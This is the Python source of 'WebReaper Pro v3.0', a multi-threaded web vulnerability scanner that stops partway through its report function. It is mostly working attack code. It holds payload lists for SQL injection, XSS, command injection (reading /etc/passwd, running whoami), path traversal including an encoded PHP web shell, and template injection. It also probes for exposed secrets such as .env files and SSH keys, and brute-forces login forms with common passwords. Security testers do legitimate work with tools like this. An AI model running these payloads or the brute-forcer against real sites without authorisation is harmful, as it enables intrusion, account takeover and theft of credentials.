#!/usr/bin/env python3
"""
WebReaper Pro v3.0 — Multi-vector Web Vulnerability Scanner
Usage: python webreaper.py <url> [--deep] [--brute] [--report] [--threads N]
*je scanne tout. je juge rien. je rapporte tout.*
"""

import urllib.request
import urllib.parse
import urllib.error
import ssl
import re
import sys
import time
import threading
import json
import socket
from queue import Queue, Empty
from html.parser import HTMLParser
from datetime import datetime
from collections import defaultdict

# ══════════════════════════════════════════════════
# ARGS
# ══════════════════════════════════════════════════

TARGET      = sys.argv[1] if len(sys.argv) > 1 else "http://testphp.vulnweb.com"
DEEP_MODE   = "--deep"   in sys.argv
BRUTE_MODE  = "--brute"  in sys.argv
REPORT_MODE = "--report" in sys.argv
THREADS     = int(sys.argv[sys.argv.index("--threads") + 1]) if "--threads" in sys.argv else 20
MAX_URLS    = 500 if DEEP_MODE else 100

# normalize origin
_parsed_target = urllib.parse.urlparse(TARGET)
ORIGIN = f"{_parsed_target.scheme}://{_parsed_target.netloc}"

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode    = ssl.CERT_NONE

RESULTS   = []
VISITED   = set()
LOCK      = threading.Lock()
VULN_LOCK = threading.Lock()

# ══════════════════════════════════════════════════
# COLOURS
# ══════════════════════════════════════════════════

R  = "\033[91m"; G  = "\033[92m"; Y  = "\033[93m"
B  = "\033[94m"; M  = "\033[95m"; C  = "\033[96m"
W  = "\033[97m"; RS = "\033[0m";  BD = "\033[1m"

# ══════════════════════════════════════════════════
# PAYLOADS
# ══════════════════════════════════════════════════

SQLI_ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "\" OR \"1\"=\"1\"--",
    "') OR ('1'='1'--",
    "1' ORDER BY 1--",
    "1' ORDER BY 99--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "admin'--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND 1=1--",
    "' AND 1=2--",
]

SQLI_TIME_PAYLOADS = [
    "' AND SLEEP(3)--",
    "1' AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "1; WAITFOR DELAY '0:0:3'--",
    "' AND (SELECT * FROM (SELECT(SLEEP(3)))x)--",
    "\" AND SLEEP(3)--",
    "') AND SLEEP(3)--",
    "1 AND SLEEP(3)--",
]

SQLI_ERRORS = [
    r"you have an error in your sql syntax",
    r"warning.*?mysql_",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"ora-\d{4,5}",
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"odbc microsoft access driver",
    r"postgresql.*?error",
    r"sqlite3?\.",
    r"syntax error.*?near",
    r"invalid query",
    r"supplied argument is not a valid mysql",
    r"pg_query\(\).*?failed",
    r"pg_exec\(\).*?failed",
    r"mysql_fetch_array\(\)",
    r"column count doesn't match",
    r"unknown column",
    r"table.*?doesn't exist",
    r"com\.mysql\.jdbc",
    r"org\.postgresql",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "';alert(1)//",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<math><mtext></p><img src=x onerror=alert(1)>",
    "<<script>alert(1)//<</script>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
]

CMDI_PAYLOADS = [
    "; whoami",
    "| whoami",
    "` whoami`",
    "$(whoami)",
    "; id",
    "| id",
    "& whoami",
    "|| whoami",
    "&& whoami",
    "; sleep 3",
    "| sleep 3",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "\nwhoami",
    "`id`",
    "$(id)",
]

CMDI_INDICATORS = [
    r"root:x:0:0",
    r"uid=\d+\(",
    r"www-data",
    r"daemon:x:",
    r"/bin/bash",
    r"/bin/sh",
    r"nobody:x:",
]

LFI_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "....//....//etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/etc/passwd",
    "..%2Fetc%2Fpasswd",
    "..%2F..%2Fetc%2Fpasswd",
    "..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "../../windows/win.ini",
    "../../../windows/win.ini",
    "../../../../windows/win.ini",
    "C:\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=../config.php",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
]

LFI_INDICATORS = [
    r"root:x:0:0",
    r"\[fonts\]",
    r"\[extensions\]",
    r"for 16-bit app support",
    r"daemon:x:",
    r"/bin/bash",
    r"nobody:x:",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{7*'7'}}",
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    "{{config}}",
    "{{config.items()}}",
    "{% debug %}",
    "*{7*7}",
    "@{7*7}",
]

REDIRECT_PARAMS = {
    "redirect", "url", "next", "return", "goto", "target", "link",
    "dest", "destination", "redir", "redirect_uri", "redirect_url",
    "continue", "forward", "location", "back", "ref", "returnurl",
    "returnto", "return_url", "return_to", "callback", "success_url",
}

SENSITIVE_FILES = [
    "/.env", "/.env.local", "/.env.production", "/.env.development",
    "/.env.staging", "/.env.backup", "/.env.bak", "/.env.old",
    "/.git/config", "/.git/HEAD", "/.git/FETCH_HEAD", "/.git/index",
    "/.git/logs/HEAD", "/.gitignore", "/.svn/entries",
    "/config.php", "/config.php.bak", "/config.php.old", "/config.inc.php",
    "/configuration.php", "/settings.php", "/database.php", "/db.php",
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old",
    "/wp-config-sample.php",
    "/database.sql", "/dump.sql", "/backup.sql", "/db.sql",
    "/data.sql", "/mysql.sql", "/site.sql",
    "/admin/", "/admin/login", "/admin/login.php", "/administrator/",
    "/administrator/index.php", "/phpmyadmin/", "/phpMyAdmin/", "/pma/",
    "/mysql/", "/panel/", "/cpanel/", "/wp-admin/",
    "/.htaccess", "/.htpasswd", "/.bash_history", "/.bash_profile",
    "/.bashrc", "/.ssh/id_rsa", "/.ssh/authorized_keys",
    "/server-status", "/server-info", "/nginx_status",
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/api/", "/api/v1/", "/api/v2/", "/api/v3/",
    "/swagger.json", "/swagger-ui.html", "/openapi.json", "/api-docs",
    "/actuator", "/actuator/env", "/actuator/mappings", "/actuator/beans",
    "/actuator/health", "/actuator/info", "/actuator/metrics",
    "/debug", "/debug.php", "/test", "/test.php",
    "/backup/", "/old/", "/temp/", "/tmp/", "/logs/", "/log/",
    "/error_log", "/access_log", "/error.log", "/access.log",
    "/info.php", "/phpinfo.php", "/php.php",
    "/.DS_Store", "/Thumbs.db", "/desktop.ini",
    "/package.json", "/package-lock.json", "/composer.json",
    "/composer.lock", "/yarn.lock", "/Gemfile", "/requirements.txt",
    "/web.config", "/applicationHost.config",
    "/readme.txt", "/README.md", "/CHANGELOG.md", "/INSTALL.txt",
    "/LICENSE.txt", "/VERSION",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "HSTS missing — HTTPS not enforced",
    "Content-Security-Policy":   "CSP missing — XSS protection absent",
    "X-Frame-Options":           "Clickjacking protection missing",
    "X-Content-Type-Options":    "MIME sniffing protection missing",
    "X-XSS-Protection":          "Legacy XSS filter not set",
    "Referrer-Policy":           "Referrer policy not set",
    "Permissions-Policy":        "Permissions policy not set",
}

BRUTEFORCE_USERS = ["admin", "administrator", "root", "user", "test", "guest", "manager"]
BRUTEFORCE_PASSWORDS = [
    "admin", "password", "123456", "admin123", "root", "toor", "pass",
    "test", "guest", "qwerty", "abc123", "letmein", "monkey", "dragon",
    "1234567890", "password1", "administrator", "login", "welcome",
    "hello", "master", "1234", "666666", "12345678", "sunshine",
    "princess", "iloveyou", "password123", "admin1234", "changeme",
    "secret", "pass123", "testing", "default", "alpine", "oracle",
]

# ══════════════════════════════════════════════════
# LOGGING
# ══════════════════════════════════════════════════

VULN_COUNT = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
REPORTED   = set()  # deduplicate findings

def log(level, msg, detail=""):
    key = f"{level}:{msg}"
    with VULN_LOCK:
        if key in REPORTED:
            return
        REPORTED.add(key)
        if level in VULN_COUNT:
            VULN_COUNT[level] += 1

    ts = datetime.now().strftime("%H:%M:%S")
    icons = {
        "CRITICAL": f"{R}{BD}[CRITICAL]{RS}",
        "HIGH":     f"{R}[HIGH]{RS}",
        "MEDIUM":   f"{Y}[MEDIUM]{RS}",
        "LOW":      f"{B}[LOW]{RS}",
        "INFO":     f"{C}[INFO]{RS}",
        "SAFE":     f"{G}[SAFE]{RS}",
        "SCAN":     f"{M}[SCAN]{RS}",
    }
    icon = icons.get(level, f"[{level}]")
    out  = f"{W}{ts}{RS} {icon} {msg}"
    if detail:
        out += f"\n         {Y}↳ {detail}{RS}"
    print(out, flush=True)

    with LOCK:
        RESULTS.append({"level": level, "msg": msg, "detail": detail, "ts": ts})

def progress(msg):
    print(f"\r{M}[~]{RS} {msg}                    ", end="", flush=True)

# ══════════════════════════════════════════════════
# HTTP CLIENT
# ══════════════════════════════════════════════════

SESSION_COOKIES = {}

def fetch(url, data=None, method=None, extra_headers=None, allow_redirect=True, timeout=10):
    # *chaque requête part comme une lettre sans retour*
    try:
        if data is not None:
            if method is None:
                method = "POST"
            if method == "GET":
                sep = "&" if "?" in url else "?"
                url = url + sep + urllib.parse.urlencode(data)
                req = urllib.request.Request(url, method="GET")
            else:
                body = urllib.parse.urlencode(data).encode()
                req  = urllib.request.Request(url, data=body, method="POST")
        else:
            req = urllib.request.Request(url, method=method or "GET")

        req.add_header("User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/122.0.0.0 Safari/537.36")
        req.add_header("Accept",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
        req.add_header("Accept-Language", "en-US,en;q=0.5")
        req.add_header("Connection", "keep-alive")

        if SESSION_COOKIES:
            cookie_str = "; ".join(f"{k}={v}" for k, v in SESSION_COOKIES.items())
            req.add_header("Cookie", cookie_str)

        if extra_headers:
            for k, v in extra_headers.items():
                req.add_header(k, v)

        if not allow_redirect:
            class NoRedirect(urllib.request.HTTPErrorProcessor):
                def http_response(self, request, response):
                    return response
                https_response = http_response
            opener = urllib.request.build_opener(NoRedirect)
        else:
            opener = urllib.request.build_opener()

        t0 = time.time()
        with opener.open(req, timeout=timeout, context=CTX) as r:
            elapsed  = time.time() - t0
            raw      = r.read(1024 * 512)  # max 512KB
            body     = raw.decode("utf-8", errors="ignore")
            headers  = {k.lower(): v for k, v in r.headers.items()}
            status   = r.status
            real_url = r.url

            # harvest cookies
            for k, v in r.headers.items():
                if k.lower() == "set-cookie":
                    m = re.match(r"([^=]+)=([^;]*)", v)
                    if m:
                        with LOCK:
                            SESSION_COOKIES[m.group(1).strip()] = m.group(2).strip()

            return body, headers, status, elapsed, real_url

    except urllib.error.HTTPError as e:
        try:
            body = e.read(65536).decode("utf-8", errors="ignore")
        except Exception:
            body = ""
        return body, {}, e.code, 0, url
    except Exception:
        return None, {}, 0, 0, url

# ══════════════════════════════════════════════════
# HTML PARSER
# ══════════════════════════════════════════════════

class SiteParser(HTMLParser):
    # *elle dévore le HTML et reconstruire sa carte*
    def __init__(self, origin):
        super().__init__()
        self.origin  = origin   # scheme://host — for same-domain filtering
        self.links   = set()
        self.forms   = []
        self._form   = None

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)

        if tag == "a":
            href = attrs.get("href", "")
            if href and not href.startswith(("javascript:", "mailto:", "tel:", "#")):
                full = urllib.parse.urljoin(self.origin, href)
                if urllib.parse.urlparse(full).netloc == urllib.parse.urlparse(self.origin).netloc:
                    # strip fragment
                    full = urllib.parse.urldefrag(full)[0]
                    self.links.add(full)

        elif tag == "form":
            action = attrs.get("action", "")
            self._form = {
                "action": urllib.parse.urljoin(self.origin, action) if action else self.origin,
                "method": attrs.get("method", "GET").upper(),
                "inputs": [],
                "enctype": attrs.get("enctype", "application/x-www-form-urlencoded"),
            }

        elif tag in ("input", "textarea", "select") and self._form is not None:
            name  = attrs.get("name", "")
            itype = attrs.get("type", "text").lower()
            value = attrs.get("value", "")
            if name:
                self._form["inputs"].append({
                    "name": name, "type": itype,
                    "value": value or ("test@test.com" if itype == "email" else
                                       "test123" if itype == "password" else "test"),
                })

    def handle_endtag(self, tag):
        if tag == "form" and self._form:
            self.forms.append(self._form)
            self._form = None

def get_params(url):
    parsed = urllib.parse.urlparse(url)
    return dict(urllib.parse.parse_qsl(parsed.query))

def inject_url(url, param, value):
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    params[param] = value
    new_q = urllib.parse.urlencode(params)
    return urllib.parse.urlunparse(parsed._replace(query=new_q))

# ══════════════════════════════════════════════════
# CRAWLER — BFS multi-threaded
# ══════════════════════════════════════════════════

def crawl_site(start_url):
    # *BFS par niveaux — elle tisse méthodiquement, jamais elle ne s'emballe*
    visited     = set()
    all_urls    = []
    all_forms   = []
    depth_limit = 4 if DEEP_MODE else 3
    lock        = threading.Lock()
    frontier    = [start_url]

    for depth in range(depth_limit + 1):
        if not frontier or len(all_urls) >= MAX_URLS:
            break

        next_frontier = []
        nf_lock       = threading.Lock()
        sem           = threading.Semaphore(min(THREADS, 10))
        threads       = []

        def fetch_page(url):
            try:
                norm = urllib.parse.urldefrag(url)[0]
                with lock:
                    if norm in visited:
                        return
                    visited.add(norm)

                body, _, status, _, _ = fetch(url, timeout=10)
                if not body or status in (404, 403):
                    return

                with lock:
                    all_urls.append(url)
                    progress(f"Crawling [{len(all_urls)}/{MAX_URLS}] d={depth} {url[:65]}")

                parser = SiteParser(ORIGIN)
                try:
                    parser.feed(body)
                except Exception:
                    pass

                with lock:
                    all_forms.extend(parser.forms)

                with nf_lock:
                    for link in parser.links:
                        lnorm = urllib.parse.urldefrag(link)[0]
                        if lnorm not in visited:
                            next_frontier.append(link)
            finally:
                sem.release()

        for url in frontier:
            if len(all_urls) >= MAX_URLS:
                break
            sem.acquire()
            t = threading.Thread(target=fetch_page, args=(url,), daemon=True)
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        # deduplicate next frontier preserving order
        seen_nf = set()
        deduped = []
        for u in next_frontier:
            n = urllib.parse.urldefrag(u)[0]
            if n not in seen_nf and n not in visited:
                seen_nf.add(n)
                deduped.append(u)
        frontier = deduped

    print()
    return all_urls, all_forms

# ══════════════════════════════════════════════════
# MODULE — SQL INJECTION
# ══════════════════════════════════════════════════

def sqli_url(url):
    # *l'apostrophe qui fait saigner la base de données*
    params = get_params(url)
    if not params:
        return

    for param, orig_val in params.items():
        # error-based
        for payload in SQLI_ERROR_PAYLOADS:
            test_url = inject_url(url, param, orig_val + payload)
            body, _, status, _, _ = fetch(test_url, timeout=10)
            if body is None:
                continue
            for err in SQLI_ERRORS:
                if re.search(err, body, re.IGNORECASE):
                    log("CRITICAL",
                        f"SQLi Error-based → {urllib.parse.urlparse(url).path}",
                        f"param={param!r} payload={payload!r} pattern={err}")
                    return

        # boolean-based differential
        url_true  = inject_url(url, param, orig_val + "' AND '1'='1")
        url_false = inject_url(url, param, orig_val + "' AND '1'='2")
        body_orig, _, _, _, _ = fetch(url, timeout=10)
        body_true, _, _, _, _ = fetch(url_true, timeout=10)
        body_false,_, _, _, _ = fetch(url_false, timeout=10)
        if body_orig and body_true and body_false:
            if (len(body_true) == len(body_orig) and
                abs(len(body_true) - len(body_false)) > 20):
                log("CRITICAL",
                    f"SQLi Boolean-based Blind → {urllib.parse.urlparse(url).path}",
                    f"param={param!r} | true_len={len(body_true)} false_len={len(body_false)}")
                return

        # time-based
        for payload in SQLI_TIME_PAYLOADS:
            test_url = inject_url(url, param, orig_val + payload)
            _, _, _, elapsed, _ = fetch(test_url, timeout=15)
            if elapsed >= 2.8:
                log("CRITICAL",
                    f"SQLi Time-based Blind → {urllib.parse.urlparse(url).path}",
                    f"param={param!r} delay={elapsed:.1f}s payload={payload!r}")
                return

def sqli_form(form):
    # *chaque input est une porte vers la base de données*
    editable = [i for i in form["inputs"] if i["type"] not in ("hidden", "submit", "button", "image", "reset")]
    if not editable:
        return

    for payload in SQLI_ERROR_PAYLOADS[:10]:
        data = {i["name"]: i["value"] for i in form["inputs"]}
        for inp in editable:
            data[inp["name"]] = inp["value"] + payload

        body, _, _, elapsed, _ = fetch(form["action"], data=data, method=form["method"], timeout=10)
        if body is None:
            continue

        for err in SQLI_ERRORS:
            if re.search(err, body, re.IGNORECASE):
                log("CRITICAL",
                    f"SQLi Form → {form['action']}",
                    f"method={form['method']} payload={payload!r} pattern={err}")
                return

    # time-based form
    for payload in SQLI_TIME_PAYLOADS[:3]:
        data = {i["name"]: i["value"] for i in form["inputs"]}
        for inp in editable:
            data[inp["name"]] = inp["value"] + payload
        _, _, _, elapsed, _ = fetch(form["action"], data=data, method=form["method"], timeout=15)
        if elapsed >= 2.8:
            log("CRITICAL",
                f"SQLi Time-based Form → {form['action']}",
                f"delay={elapsed:.1f}s payload={payload!r}")
            return

# ══════════════════════════════════════════════════
# MODULE — XSS
# ══════════════════════════════════════════════════

def xss_url(url):
    # *le payload cherche son reflet dans le miroir du DOM*
    params = get_params(url)
    if not params:
        return

    for param in params:
        for payload in XSS_PAYLOADS:
            test_url = inject_url(url, param, payload)
            body, _, _, _, _ = fetch(test_url, timeout=8)
            if body and payload.lower() in body.lower():
                log("HIGH",
                    f"XSS Reflected → {urllib.parse.urlparse(url).path}",
                    f"param={param!r} payload={payload!r}")
                return
            # partial match (filtered but partially reflected)
            if body and any(p in body for p in ["<script", "onerror", "onload", "alert("]):
                if payload[:10] in body:
                    log("MEDIUM",
                        f"XSS Partial Reflection → {urllib.parse.urlparse(url).path}",
                        f"param={param!r}")
                    return

def xss_form(form):
    editable = [i for i in form["inputs"] if i["type"] not in ("hidden", "submit", "button", "image", "reset")]
    if not editable:
        return

    for payload in XSS_PAYLOADS[:8]:
        data = {i["name"]: i["value"] for i in form["inputs"]}
        for inp in editable:
            data[inp["name"]] = payload

        body, _, _, _, _ = fetch(form["action"], data=data, method=form["method"], timeout=8)
        if body and payload.lower() in body.lower():
            log("HIGH",
                f"XSS Reflected Form → {form['action']}",
                f"method={form['method']} payload={payload!r}")
            return

# ══════════════════════════════════════════════════
# MODULE — COMMAND INJECTION
# ══════════════════════════════════════════════════

def cmdi_url(url):
    # *envoyer des syscalls là où le dev attendait du texte*
    params = get_params(url)
    if not params:
        return

    for param, orig_val in params.items():
        for payload in CMDI_PAYLOADS:
            test_url = inject_url(url, param, orig_val + payload)
            body, _, _, elapsed, _ = fetch(test_url, timeout=10)
            if body is None:
                continue
            for ind in CMDI_INDICATORS:
                if re.search(ind, body):
                    log("CRITICAL",
                        f"Command Injection → {urllib.parse.urlparse(url).path}",
                        f"param={param!r} payload={payload!r}")
                    return
            if "sleep" in payload and elapsed >= 2.5:
                log("CRITICAL",
                    f"Command Injection Time-based → {urllib.parse.urlparse(url).path}",
                    f"param={param!r} delay={elapsed:.1f}s")
                return

# ══════════════════════════════════════════════════
# MODULE — LFI
# ══════════════════════════════════════════════════

def lfi_url(url):
    # *traverser les dossiers comme des couloirs interdits*
    params = get_params(url)
    if not params:
        return

    # prioritize suspicious param names
    file_params = [p for p in params if any(k in p.lower()
        for k in ("file", "page", "path", "include", "load", "template",
                  "view", "doc", "dir", "folder", "cat", "module", "show",
                  "content", "section", "lang", "locale", "read", "open"))]
    targets = file_params if file_params else list(params.keys())

    for param in targets:
        for payload in LFI_PAYLOADS:
            test_url = inject_url(url, param, payload)
            body, _, _, _, _ = fetch(test_url, timeout=8)
            if body is None:
                continue
            for ind in LFI_INDICATORS:
                if re.search(ind, body):
                    log("CRITICAL",
                        f"LFI Path Traversal → {urllib.parse.urlparse(url).path}",
                        f"param={param!r} payload={payload!r}")
                    return

# ══════════════════════════════════════════════════
# MODULE — SSTI
# ══════════════════════════════════════════════════

def ssti_url(url):
    # *{{7*7}} — si le site répond 49 t'as du RCE*
    params = get_params(url)
    if not params:
        return

    for param in params:
        for payload in SSTI_PAYLOADS:
            test_url = inject_url(url, param, payload)
            body, _, _, _, _ = fetch(test_url, timeout=8)
            if body and "49" in body and "{{7*7}}" not in body:
                log("CRITICAL",
                    f"SSTI (Server-Side Template Injection) → {urllib.parse.urlparse(url).path}",
                    f"param={param!r} payload={payload!r} response contains '49'")
                return
            if body and payload in body:
                log("MEDIUM",
                    f"SSTI Potential (payload reflected) → {urllib.parse.urlparse(url).path}",
                    f"param={param!r}")

# ══════════════════════════════════════════════════
# MODULE — OPEN REDIRECT
# ══════════════════════════════════════════════════

def open_redirect_url(url):
    # *convaincre le serveur de nous envoyer ailleurs*
    params = get_params(url)
    rparams = [p for p in params if p.lower() in REDIRECT_PARAMS]
    if not rparams:
        return

    evil = "https://evil.example-canary.com"
    for param in rparams:
        for val in [evil, f"//{evil[8:]}", f"/{evil}"]:
            test_url = inject_url(url, param, val)
            _, headers, status, _, real_url = fetch(test_url, allow_redirect=False, timeout=8)
            loc = headers.get("location", "")
            if "evil.example-canary" in loc or "evil.example-canary" in (real_url or ""):
                log("HIGH",
                    f"Open Redirect → {urllib.parse.urlparse(url).path}",
                    f"param={param!r} redirects to {loc}")
                return

# ══════════════════════════════════════════════════
# MODULE — SENSITIVE FILES
# ══════════════════════════════════════════════════

def check_sensitive_files():
    # *frapper à chaque porte jusqu'à en trouver une ouverte*
    lock  = threading.Lock()
    queue = Queue()
    for path in SENSITIVE_FILES:
        queue.put(path)

    def worker():
        while not queue.empty():
            try:
                path = queue.get_nowait()
            except Empty:
                return
            url  = ORIGIN + path
            body, headers, status, _, _ = fetch(url, timeout=6)
            if status == 200 and body and len(body) > 10:
                sev = "CRITICAL" if any(x in path for x in
                      (".env", ".git", "config", "passwd", ".sql", ".htpasswd",
                       "id_rsa", "shadow", "wp-config")) else \
                      "HIGH" if any(x in path for x in
                      ("admin", "phpinfo", "phpMyAdmin", "pma", "actuator",
                       "swagger", "openapi")) else "MEDIUM"
                with lock:
                    log(sev,
                        f"Sensitive File Exposed → {path}",
                        f"HTTP {status} | {len(body)} bytes")
            queue.task_done()

    workers = [threading.Thread(target=worker, daemon=True) for _ in range(THREADS)]
    for w in workers:
        w.start()
    queue.join()

# ══════════════════════════════════════════════════
# MODULE — SECURITY HEADERS + FINGERPRINT
# ══════════════════════════════════════════════════

def check_headers():
    # *les headers trahissent leur maître*
    body, headers, status, _, _ = fetch(TARGET, timeout=8)
    if not headers:
        return

    for header, reason in SECURITY_HEADERS.items():
        if header.lower() not in headers:
            log("LOW", f"Missing Header → {header}", reason)

    server = headers.get("server", "")
    if server:
        log("INFO", f"Server Disclosed → {server}", "fingerprinting risk")

    powered = headers.get("x-powered-by", "")
    if powered:
        log("MEDIUM", f"Tech Stack Disclosed → X-Powered-By: {powered}",
            "reveals backend technology")

    aspnet = headers.get("x-aspnet-version", "")
    if aspnet:
        log("MEDIUM", f"ASP.NET Version Disclosed → {aspnet}")

    for hname, hval in headers.items():
        if hname == "set-cookie":
            flags = hval.lower()
            if "httponly" not in flags:
                log("MEDIUM", "Cookie missing HttpOnly", f"{hval[:60]}")
            if "secure" not in flags:
                log("LOW",    "Cookie missing Secure flag", f"{hval[:60]}")
            if "samesite" not in flags:
                log("LOW",    "Cookie missing SameSite", f"{hval[:60]}")

# ══════════════════════════════════════════════════
# MODULE — CORS
# ══════════════════════════════════════════════════

def check_cors():
    # *le serveur va-t-il laisser n'importe qui le toucher ?*
    evil = "https://evil-attacker.pwned.com"
    _, headers, _, _, _ = fetch(TARGET, extra_headers={"Origin": evil}, timeout=8)
    if not headers:
        return

    acao = headers.get("access-control-allow-origin", "")
    acac = headers.get("access-control-allow-credentials", "")

    if acao == "*":
        log("MEDIUM", "CORS Wildcard → Access-Control-Allow-Origin: *",
            "any domain can read unauthenticated responses")
    elif acao == evil:
        if acac.lower() == "true":
            log("CRITICAL", "CORS + Credentials → reflects evil origin with credentials!",
                f"authenticated cross-origin reads possible from {evil}")
        else:
            log("HIGH", "CORS Misconfiguration → arbitrary origin reflected",
                f"ACAO: {acao}")

# ══════════════════════════════════════════════════
# MODULE — INFO LEAK
# ══════════════════════════════════════════════════

def check_info_leak(url):
    # *le code bavard trahit ses secrets dans les réponses d'erreur*
    body, _, _, _, _ = fetch(url, timeout=8)
    if not body:
        return

    patterns = {
        "Stack Trace (Java)": r"at\s+[\w\.$]+\([\w]+\.java:\d+\)",
        "Stack Trace (.NET)": r"at\s+[\w\.\s]+\([\w\s,]*\)\s+in\s+\w",
        "PHP Error":          r"(Parse error|Fatal error|Warning|Notice).*?on line \d+",
        "Python Traceback":   r"Traceback \(most recent call last\)",
        "Debug Mode":         r"(var_dump|print_r|debug_backtrace|dd\(|dump\()\s*\(",
        "SQL Query Leaked":   r"(SELECT\s+[\w\*,\s]+FROM|INSERT\s+INTO|UPDATE\s+\w+\s+SET)",
        "AWS Access Key":     r"AKIA[0-9A-Z]{16}",
        "AWS Secret Key":     r"(?i)aws.{0,20}secret.{0,20}['\"][0-9a-zA-Z/+]{40}['\"]",
        "Private Key":        r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
        "JWT Token":          r"eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]+",
        "Basic Auth Creds":   r"(?i)(password|passwd|pwd|secret|token)\s*[=:]\s*['\"]?[\w@#$!%]{6,}",
        "Internal IP":        r"\b(10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+)\b",
        "Email Address":      r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,6}",
    }

    for label, pat in patterns.items():
        m = re.search(pat, body)
        if m:
            sev = "CRITICAL" if label in ("AWS Access Key", "AWS Secret Key", "Private Key") else \
                  "HIGH"     if label in ("Stack Trace (Java)", "Stack Trace (.NET)",
                                          "SQL Query Leaked", "JWT Token", "Python Traceback") else \
                  "MEDIUM"
            log(sev, f"Info Leak → {label}",
                f"match: {m.group(0)[:100]!r}")

# ══════════════════════════════════════════════════
# MODULE — BRUTE FORCE
# ══════════════════════════════════════════════════

def brute_force_login(forms):
    # *l'hydre essaie chaque combinaison jusqu'à trouver la faille*
    if not BRUTE_MODE:
        log("INFO", "Brute force disabled (add --brute to enable)")
        return

    login_forms = [f for f in forms if any(i["type"] == "password" for i in f["inputs"])]
    if not login_forms:
        log("INFO", "No login forms found")
        return

    for form in login_forms:
        user_inputs = [i for i in form["inputs"] if i["type"] in ("text", "email")]
        pass_inputs = [i for i in form["inputs"] if i["type"] == "password"]
        if not user_inputs or not pass_inputs:
            continue

        log("SCAN", f"Brute force → {form['action']}")
        baseline, _, baseline_status, _, _ = fetch(form["action"], timeout=8)

        for user in BRUTEFORCE_USERS:
            for pwd in BRUTEFORCE_PASSWORDS:
                data = {i["name"]: i["value"] for i in form["inputs"]}
                data[user_inputs[0]["name"]] = user
                data[pass_inputs[0]["name"]] = pwd

                body, _, status, _, real_url = fetch(
                    form["action"], data=data, method=form["method"], timeout=8)
                if body is None:
                    continue

                fail_words = {"invalid", "incorrect", "wrong", "failed",
                              "error", "denied", "unauthorized", "bad credentials"}
                is_fail = any(w in body.lower() for w in fail_words)

                if not is_fail:
                    if status in (301, 302) and real_url != form["action"]:
                        log("CRITICAL",
                            f"Login SUCCESS → {form['action']}",
                            f"user={user!r} pass={pwd!r} redirect→{real_url}")
                        return
                    elif baseline and abs(len(body) - len(baseline)) > 50:
                        log("HIGH",
                            f"Possible Login → {form['action']}",
                            f"user={user!r} pass={pwd!r} response size differs")
                        return

# ══════════════════════════════════════════════════
# REPORT
# ══════════════════════════════════════════════════

def print_report(start_time, n_urls, n_forms):
    elapsed = time.time() - start_time
    print(f"\n{'═'*68}")
    print(f"{BD}{W}   WebReaper Pro v3.0 — FINAL REPORT{RS}")
    print(f"{'═'*68}")
    print(f"  {C}Target   {RS}: {TARGET}")
    print(f"  {C}URLs     {RS}: {n_urls} crawled | {n_forms} forms found")
    print(f"  {C}Duration {RS}: {elapsed:.1f}s")
    print(f"  {C}Date     {RS}: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'─'*68}")
    print(f"  {R}{BD}CRITICAL {RS}: {VULN_COUNT['CRITICAL']}")
    print(f"  {R}HIGH     {RS}: {VULN_COUNT['HIGH']}")
    print(f"  {Y}MEDIUM   {RS}: {VULN_COUNT['MEDIUM']}")
    print(f"  {B}LOW      {RS}: {VULN_COUNT['LOW']}")
    print(f"  {C}INFO     {RS}: {VULN_COUNT['INFO']}")
    print(f"{'─'*68}")
    total = sum(VULN_COUNT.values())
